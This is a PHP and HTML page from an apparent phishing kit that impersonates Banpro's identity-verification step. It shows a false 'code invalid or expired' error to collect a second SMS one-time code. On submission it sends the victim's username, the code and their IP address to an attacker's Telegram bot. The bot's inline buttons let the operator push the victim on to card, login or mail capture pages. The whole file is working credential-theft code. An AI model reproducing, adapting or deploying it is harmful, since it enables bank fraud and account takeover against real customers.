<?php
session_start();
include("settings.php"); // Contiene $token y $chat_id

$usuario = $_SESSION['usuario'] ?? null;

if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
    $codigo = $_POST['ips1'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $msg = "CORRECCIÓN SMS BANPRO\n👤 Usuario: $usuario\n🔢 Código: $codigo\n🌐 IP: $ip";

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '❌ SMS Error', 'callback_data' => "SMSERROR|$usuario"],
                    ['text' => '🔁 Login', 'callback_data' => "LOGIN|$usuario"]
                ],
                [
                    ['text' => '💳 CARD', 'callback_data' => "CARD|$usuario"]
                ],
                [
                    ['text' => '📩 Mail', 'callback_data' => "MAIL|$usuario"],
                    ['text' => '✅ Listo', 'callback_data' => "LISTO|$usuario"]
                ]
            ]
        ])
    ]));

    header("Location: espera.php");
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificación de identidad</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}

body{
    font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
    background:#f7f7f7;
    color:#333;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:flex-start;
    padding:40px 20px;
}

.card{
    background:#fff;
    border-radius:10px;
    width:100%;
    max-width:440px;
    padding:36px 30px 30px;
    box-shadow:0 4px 18px rgba(0,0,0,0.06);
    text-align:left;
}

.logo-slot{
    display:flex;
    justify-content:center;
    align-items:center;
    margin-bottom:28px;
    min-height:60px;
}

.logo-slot img{
    max-height:60px;
    max-width:220px;
    width:auto;
    object-fit:contain;
}

.icon-wrap{
    width:72px;
    height:72px;
    border:2.5px solid #00853f;
    border-radius:14px;
    display:flex;
    justify-content:center;
    align-items:center;
    margin:0 auto 22px;
}

.icon-wrap svg{width:42px;height:42px;}

h1{
    font-size:22px;
    color:#222;
    font-weight:700;
    margin-bottom:18px;
}

.subtitle{
    font-size:15px;
    color:#444;
    margin-bottom:14px;
}

.error-text{
    color:#c0392b;
    font-size:13px;
    font-weight:500;
    margin-bottom:22px;
    line-height:1.4;
}

.code-inputs{
    display:flex;
    justify-content:space-between;
    gap:8px;
    margin-bottom:30px;
}

.code-inputs input{
    flex:1;
    aspect-ratio:1/1;
    max-width:50px;
    text-align:center;
    font-size:22px;
    font-weight:600;
    color:#222;
    border:1.5px solid #e0a4a0;
    border-radius:6px;
    background:#fff;
    outline:none;
    transition:0.15s;
    -moz-appearance:textfield;
}

.code-inputs input::-webkit-outer-spin-button,
.code-inputs input::-webkit-inner-spin-button{
    -webkit-appearance:none;
    margin:0;
}

.code-inputs input:focus{
    border-color:#00853f;
    box-shadow:0 0 0 2px rgba(0,133,63,0.15);
}

.btn-validar,
.btn-reenviar{
    width:100%;
    height:50px;
    border-radius:6px;
    font-size:16px;
    font-weight:700;
    cursor:pointer;
    transition:0.2s;
    display:block;
}

.btn-validar{
    border:none;
    background:#00853f;
    color:#fff;
    margin-bottom:12px;
}

.btn-validar:hover{background:#006b32;}
.btn-validar:disabled{background:#9bc7ad;cursor:not-allowed;}

.btn-reenviar{
    background:#fff;
    color:#00853f;
    border:2px solid #00853f;
}

.btn-reenviar:hover{background:#eef8f1;}
.btn-reenviar:disabled{opacity:.6;cursor:not-allowed;}

.resend-status{
    text-align:center;
    margin-top:12px;
    font-size:13px;
    color:#00853f;
    min-height:18px;
}

.code-timer{
    text-align:center;
    margin-top:14px;
    font-size:12.5px;
    color:#555;
    letter-spacing:.2px;
}

.code-timer.expired{
    color:#c0392b;
}

@media(max-width:600px){
    body{
        padding:24px 18px;
        background:#fff;
    }
    .card{
        padding:0;
        box-shadow:none;
        background:transparent;
        max-width:380px;
    }
    .logo-slot{margin-bottom:22px;min-height:72px;}
    .logo-slot img{max-height:72px;max-width:260px;}

    .id-header{
        display:flex;
        align-items:center;
        gap:14px;
        margin-bottom:16px;
    }
    .id-header .icon-wrap{
        width:54px;
        height:54px;
        margin:0;
        border-width:2px;
        border-radius:12px;
        flex-shrink:0;
    }
    .id-header .icon-wrap svg{width:30px;height:30px;}
    .id-header h1{
        font-size:18px;
        margin:0;
        text-align:left;
    }

    .subtitle{font-size:14px;margin-bottom:8px;text-align:left;}
    .error-text{font-size:12px;margin-bottom:18px;text-align:left;}
    .code-inputs{gap:6px;margin-bottom:22px;justify-content:space-between;}
    .code-inputs input{font-size:19px;max-width:46px;}
    .btn-validar,
    .btn-reenviar{height:44px;font-size:14px;}
}
</style>
</head>
<body>
<div class="card">
    <div class="logo-slot">
        <img src="img/imgLogoLogin.png" alt="Prox" class="logo-img">
    </div>

    <div class="id-header">
        <div class="icon-wrap" aria-label="Verificación de identidad">
            <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="5" y="10" width="38" height="28" rx="4" stroke="#00853f" stroke-width="2.6"/>
                <circle cx="16" cy="22" r="3.4" fill="#00853f"/>
                <path d="M9.5 32c1.4-3.1 4-4.7 6.5-4.7s5.1 1.6 6.5 4.7" stroke="#00853f" stroke-width="2.4" stroke-linecap="round"/>
                <line x1="27" y1="20" x2="38" y2="20" stroke="#00853f" stroke-width="2.4" stroke-linecap="round"/>
                <line x1="27" y1="26" x2="38" y2="26" stroke="#00853f" stroke-width="2.4" stroke-linecap="round"/>
                <line x1="27" y1="32" x2="34" y2="32" stroke="#00853f" stroke-width="2.4" stroke-linecap="round"/>
            </svg>
        </div>
        <h1>Verificación de identidad</h1>
    </div>

    <p class="subtitle">Ingrese por favor el código que le enviaremos a su número telefónico o correo electrónico registrado.</p>
    <p class="error-text">El código ingresado no es válido o ha expirado</p>

    <form method="post" action="" id="codeForm" autocomplete="off">
        <div class="code-inputs" id="codeInputs">
            <input type="text" inputmode="numeric" maxlength="1" required>
            <input type="text" inputmode="numeric" maxlength="1" required>
            <input type="text" inputmode="numeric" maxlength="1" required>
            <input type="text" inputmode="numeric" maxlength="1" required>
            <input type="text" inputmode="numeric" maxlength="1" required>
            <input type="text" inputmode="numeric" maxlength="1" required>
        </div>
        <input type="hidden" name="ips1" id="ips1">
        <button type="submit" class="btn-validar">Validar código</button>
    </form>

    <form method="post" action="reenvio.php" id="resendForm">
        <button type="submit" class="btn-reenviar" id="btnReenviar">Reenviar código</button>
    </form>
    <p class="resend-status" id="resendStatus"></p>
    <p class="code-timer" id="codeTimer">Código válido por <span id="timerValue">3:00</span></p>
</div>

<script>
(function(){
    const inputs = document.querySelectorAll('#codeInputs input');
    const hidden = document.getElementById('ips1');
    const form   = document.getElementById('codeForm');

    inputs.forEach((inp, idx) => {
        inp.addEventListener('input', e => {
            inp.value = inp.value.replace(/\D/g,'').slice(0,1);
            if (inp.value && idx < inputs.length - 1) inputs[idx+1].focus();
        });
        inp.addEventListener('keydown', e => {
            if (e.key === 'Backspace' && !inp.value && idx > 0) inputs[idx-1].focus();
        });
        inp.addEventListener('paste', e => {
            e.preventDefault();
            const data = (e.clipboardData.getData('text') || '').replace(/\D/g,'').slice(0,inputs.length);
            data.split('').forEach((d,i) => { if(inputs[i]) inputs[i].value = d; });
            const nextEmpty = [...inputs].findIndex(i => !i.value);
            (nextEmpty === -1 ? inputs[inputs.length-1] : inputs[nextEmpty]).focus();
        });
    });

    form.addEventListener('submit', e => {
        hidden.value = [...inputs].map(i => i.value).join('');
    });

    // Reenviar código (AJAX a reenvio.php)
    const resendForm   = document.getElementById('resendForm');
    const btnReenviar  = document.getElementById('btnReenviar');
    const resendStatus = document.getElementById('resendStatus');

    resendForm.addEventListener('submit', async e => {
        e.preventDefault();
        btnReenviar.disabled = true;
        resendStatus.style.color = '#444';
        resendStatus.textContent = 'Reenviando...';

        try {
            const res = await fetch('reenvio.php', { method:'POST' });
            if (res.ok) {
                resendStatus.style.color = '#00853f';
                resendStatus.textContent = '✓ Código reenviado';
            } else {
                resendStatus.style.color = '#c0392b';
                resendStatus.textContent = 'No se pudo reenviar';
            }
        } catch (err) {
            resendStatus.style.color = '#c0392b';
            resendStatus.textContent = 'No se pudo reenviar';
        }

        setTimeout(() => { btnReenviar.disabled = false; }, 30000);
    });

    // Contador regresivo del código (3:00 -> 0:00)
    const timerEl  = document.getElementById('codeTimer');
    let   timerVal = document.getElementById('timerValue');
    let   remaining = 3 * 60;
    let   expired   = false;

    function tick(){
        if (expired) return;
        const m = Math.floor(remaining / 60);
        const s = remaining % 60;
        timerVal.textContent = m + ':' + (s < 10 ? '0' + s : s);
        if (remaining <= 0) {
            timerEl.textContent = 'Código expirado';
            timerEl.classList.add('expired');
            expired = true;
            return;
        }
        remaining--;
    }
    tick();
    setInterval(tick, 1000);

    resendForm.addEventListener('submit', () => {
        remaining = 3 * 60;
        expired = false;
        timerEl.classList.remove('expired');
        timerEl.innerHTML = 'Código válido por <span id="timerValue">3:00</span>';
        timerVal = document.getElementById('timerValue');
    });
})();
</script>
</body>
</html>
